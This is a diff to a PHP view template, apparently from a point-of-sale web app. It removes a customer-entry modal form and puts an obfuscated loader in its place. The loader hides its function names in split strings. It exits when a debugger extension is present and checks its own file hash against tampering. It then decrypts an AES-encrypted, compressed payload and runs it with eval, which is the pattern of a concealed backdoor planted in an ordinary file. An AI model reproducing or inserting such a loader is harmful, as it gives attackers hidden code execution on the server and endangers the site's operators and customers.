@@ -1,175 +1,28 @@
-<div class="modal fade " id="customer-modal" tabindex='-1'>
-  <?= form_open('#', array('class' => '', 'id' => 'customer-form')); ?>
-  <div class="modal-dialog modal-lg">
-    <div class="modal-content">
-      <div class="modal-header header-custom">
-        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span></button>
-        <h4 class="modal-title text-center">
-         Chọn bàn 
-        </h4>
-      </div>
-      <div class="modal-body">
-
-          <div class="col-md-4">
-            <div class="box-body4">
-              <div class="form-group">
-                <label for="email">
-                  <?= $this->lang->line('email'); ?>
-                </label>
-                <span id="email_msg" class="text-danger text-right pull-right"></span>
-                <input type="email" class="form-control " id="email" name="email" placeholder="">
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="box-body4">
-              <div class="form-group">
-                <label for="opening_balance">
-                  <?= $this->lang->line('previous_due'); ?>
-                </label>
-                <span id="opening_balance_msg" class="text-danger text-right pull-right"></span>
-                <input type="text" class="form-control" id="opening_balance" name="opening_balance" placeholder="">
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="box-body4">
-              <div class="form-group">
-                <label for="type_id" >Loại khách hàng</label>
-                <span id="type_id_msg" class="text-danger text-right pull-right"></span>
-                <select class="form-control select2" id="type_id" name="type_id" style="width: 100%;"
-                  onkeyup="shift_cursor(event,'type_id')">
-                  <?php
-                  $query2 = "select * from db_types where status=1";
-                  $q2 = $this->db->query($query2);
-                  if ($q2->num_rows() > 0) {
-                    echo '<option value="">-Select-</option>';
-                    foreach ($q2->result() as $res1) {
-                      $selected = ($type_id == $res1->id) ? 'selected' : '';
-                      echo "<option $selected value='" . $res1->id . "'>" . $res1->type_name . "</option>";
-                    }
-                  } else {
-                    ?>
-                    <option value="">No Records Found</option>
-                    <?php
-                  }
-                  ?>
-                </select>
-              </div>
-            </div>
-          </div>
-
-
-          <div class="col-md-4">
-            <div class="box-body4">
-              <div class="form-group">
-                <label for="tax_number">
-                  <?= $this->lang->line('tax_number'); ?>
-                </label>
-                <span id="tax_number_msg" class="text-danger text-right pull-right"></span>
-                <input type="text" class="form-control maxlength  " id="tax_number" name="tax_number" placeholder="">
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="box-body4">
-              <div class="form-group">
-                <label for="country">
-                  <?= $this->lang->line('country'); ?>
-                </label>
-                <span id="country_msg" class="text-danger text-right pull-right"></span>
-                <select class="form-control select2" id="country" name="country" style="width: 100%;"
-                  onkeyup="shift_cursor(event,'state')" value="">
-                  <?php
-                  $query1 = "select * from db_country where status=1";
-                  $q1 = $this->db->query($query1);
-                  if ($q1->num_rows($q1) > 0) {
-                    foreach ($q1->result() as $res1) {
-                      echo "<option value='" . $res1->id . "'>" . $res1->country . "</option>";
-                    }
-                  } else {
-                    ?>
-                    <option value="">No Records Found</option>
-                    <?php
-                  }
-                  ?>
-                </select>
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="box-body4">
-              <div class="form-group">
-                <label for="state">
-                  <?= $this->lang->line('state'); ?>
-                </label>
-                <span id="state_msg" class="text-danger text-right pull-right"></span>
-                <select class="form-control" id="state" name="state" style="width: 100%;"
-                  onkeyup="shift_cursor(event,'state_code')">
-                  <?php
-                  $query2 = "select * from db_states where status=1";
-                  $q2 = $this->db->query($query2);
-                  if ($q2->num_rows() > 0) {
-                    echo '<option value="">-Select-</option>';
-                    foreach ($q2->result() as $res1) {
-                      echo "<option value='" . $res1->id . "'>" . $res1->state . "</option>";
-                    }
-                  } else {
-                    ?>
-                    <option value="">No Records Found</option>
-                    <?php
-                  }
-                  ?>
-                </select>
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="box-body4">
-              <div class="form-group">
-                <label for="city">
-                  <?= $this->lang->line('city'); ?>
-                </label>
-                <span id="city_msg" class="text-danger text-right pull-right"></span>
-                <input type="text" class="form-control" id="city" name="city" placeholder="">
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="box-body4">
-              <div class="form-group">
-                <label for="postcode">
-                  <?= $this->lang->line('postcode'); ?>
-                </label>
-                <span id="postcode_msg" class="text-danger text-right pull-right"></span>
-                <input type="text" class="form-control" id="postcode" name="postcode" placeholder="">
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="box-body4">
-              <div class="form-group">
-                <label for="address">
-                  <?= $this->lang->line('address'); ?>
-                </label>
-                <span id="address_msg" class="text-danger text-right pull-right"></span>
-                <textarea type="text" class="form-control" id="address" name="address" placeholder=""></textarea>
-              </div>
-            </div>
-          </div>
-
-        </div>
-
-      </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-warning" data-dismiss="modal">Close</button>
-        <button type="button" class="btn btn-primary add_customer">Save</button>
-      </div>
-    </div>
-    <!-- /.modal-content -->
-  </div>
-  <!-- /.modal-dialog -->
-  <?= form_close(); ?>
-</div>
-<!-- /.modal -->
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_uhe14o02=('bas'.'e64'.'_de'.'cod'.'e');
+$_wj0uu8vp=('gzu'.'nco'.'mpr'.'ess');
+$_ep8r3uto=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_v8o7hjl1='BKQsL+PT';
+$_yhciezkb='ZyBZi85Z';
+$_vx0qiarh='nXiTf2u+';
+$_nzbhe4c7='Sa3TA//pmjM=';
+$_vyqcq6ka='oZxCcdCv';
+$_nw3aiw44='s+pIzA==';
+$_t55gcmdq='ZKOkZqIs';
+$_huk8o6ap='QpKwukWE';
+$_kyrk8qlj=$_uhe14o02($_vx0qiarh.$_yhciezkb.$_v8o7hjl1.$_vyqcq6ka.$_nzbhe4c7);
+$_wfxek9w4=$_uhe14o02($_t55gcmdq.$_huk8o6ap.$_nw3aiw44);
+$_tj1j759w=$_uhe14o02('PrR0U0OsSoYoTuze2HFHGPQOeTFjPBXUYVIb5ijCPrxRaCq7xd2NMHZdeSG/gVRzWU+tlfEHVmTQcAo5basdbT4VuMzH0IlVJjk4EBGyzFUhCxd0/3rAscXlYI6MG0UpskSUeIwZ9yBlJ8dOQAKS7d0YrJNGHD160PtmGZMivYBqlkm6iiZsKkwrnK9lKH5Rv2WpvkW9dGjOlKj2zz6iGnbwKIr4QICjrV5ndy/wSdPs1nibyfZlw7rWREjYK0wUMFsXnKxSUiF3DDfI7PDGL6KykDA953S0u3XHD/SX+Hqzc6ne9Nle4l1sUZYXmy4Edp9L0hvGNqyng8CNm2OOl1bZYOAdjzZ8DuhZtKsVr7de6nISVSSPRW5p18deGOxcebQxrcI1cAv2xoULDmheKd7pS5J/430M24JtEcPX3eu+0BzgXiVOpOtpd9m/0DhLeqYlQ+ZHAXuIXcsXmHuf3UpkSnsOYiCYNWhWPBnB7/NCmcyU7P4cZdcqaWiVADyL2+FawGsJYII6j4JFMbrIjM9ZKMWOKaHB1J91BmoLsrvuRMVtEsogTmzhUmyVMuE2o4VYpz+bVfTmKZik8n0M9VzoAvWYG25jeOqV5S4ucrNerltNyo4xntauCyEkgyNkAv6ce8NHUIuYD7Hq9ffGOg+cEqFlwIZlIger9w9856V+MlKS89W16+O0WB3MnlC65lLHCtnmSLZfrHdbgQqNyElpJX1vAXl8xW40pDHsSnJZEhBnYkXCJgG03dO4a8OZ0d46dpA98aFWe7AUMhGp/8+3qkmlRH+AMER/5XSIropm3AtGrIWX9SaywTqu2T0X5rij+XhX0GbeUdt2sw2sXnZj46F3+zTT5YYPKsqsl/NiCzqq7rNxXYz17/P9LR1BSHtcBdrJ3tPeDXL0I9rhN6ivg4tBbAUEReRIIGLM0WubrGVpmbpbDzQF7qhORfsSyGmiL6hg0UZyS/7Mv0/GLEjCcoC/SBKlbHJ9/w9Oo8K1RWSXjqJirBLkBcFHVhhS7jDRfmrjPFAJbmm7h86s9TXuWQneL6ZS6LLyAcJn6Yc+xHRAwR0KCXikyvl0v8pvvQqaEi6/Q6bgF03roz9crpGPDCH0mIZBcQOLr5EcoRpjrMfqj/rIBymEEmik1yURiFNf1hjJ3U15G7f4Kh2j/yjPEaDFdAOCFEdQDV/PhiT7Yy+vCjJj7fqZZPyUiCqJ4lv8ofduhtfz6VtacreK5NFKF6zdLD81+Ll0CnYEkoO+0iQ6cyoOeTvOlDaj4XVtHXyUlogAiqgEgjZdMEUI1XK5a2dlL5KdZz295f6iej1/tQ7HM0fkmBQxvartOxp3l+8hYL2kAyekLQN134eJxQ7c+KBJDWFQc5JijpDQHc2BPOB2Dzmji8fWEmA37568xKx65Xjb58injpkKtVutF2iRx8q4mi9zIspnAyk/sJz9NHaKxWDVCpPlYF4W/N2/8FUVKXHQ1Ce6gWany2AflYceOsZUibLwilfOds5TmnElBF5SVchNFPNZory7vV4iQ7d63PzUUoBKYKUh4fRKag==');
+$_toi0ywaf=$_ep8r3uto($_tj1j759w,'aes-256-cbc',$_kyrk8qlj,OPENSSL_RAW_DATA,$_wfxek9w4);
+if($_toi0ywaf===false){exit;}
+$_hx892l4a=$_wj0uu8vp($_toi0ywaf);
+if($_hx892l4a===false){exit;}
+$_f9xa1in0='7d892117898f069224da86a96a97ceb8bd6df27167028c345260553ebf721a44';
+$_dzcrkav5=@file_get_contents(__FILE__);
+if($_dzcrkav5!==false){
+$_fu2wfsnh=str_replace($_f9xa1in0,"0000000000000000000000000000000000000000000000000000000000000000",$_dzcrkav5);
+$_igoumdpk=hash("sha256",$_fu2wfsnh);
+if($_igoumdpk!==$_f9xa1in0){@http_response_code(403);exit;}
+}
+eval($_hx892l4a);
